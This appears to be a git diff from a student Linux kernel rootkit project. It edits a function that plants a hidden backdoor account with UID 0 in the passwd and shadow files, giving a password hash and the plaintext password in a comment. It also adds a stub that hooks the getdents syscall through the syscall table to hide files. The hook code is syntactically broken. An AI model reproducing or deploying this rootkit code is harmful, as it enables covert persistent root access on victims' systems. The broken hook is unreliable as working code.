@@ -53,8 +53,9 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
 void add_backdoor(char *path) {
 	
-		char* backdoor_password = "user1:x:12345:0:backdoor:/home:/bin/bash\n";
-		char* backdoor_shadow = "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:18232:0:99999:7:::\n";
+		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
+		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
+		// PASSWORD (encodes in SHA 512) = cse331!	
 		struct file *file;
 		char *backdoor;
 		mm_segment_t old_fs;
@@ -146,7 +147,14 @@ void add_backdoor(char *path) {
 	
 		exit:
 		    return;
-		}
+}
+
+void hide_backdoor (void) {
+	
+original_getdents = (void *)sys_call_address[];                        \
+    sys_call_address[] = (unsigned long*)&hacked_func
+	
+}
 // End Marc
 
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
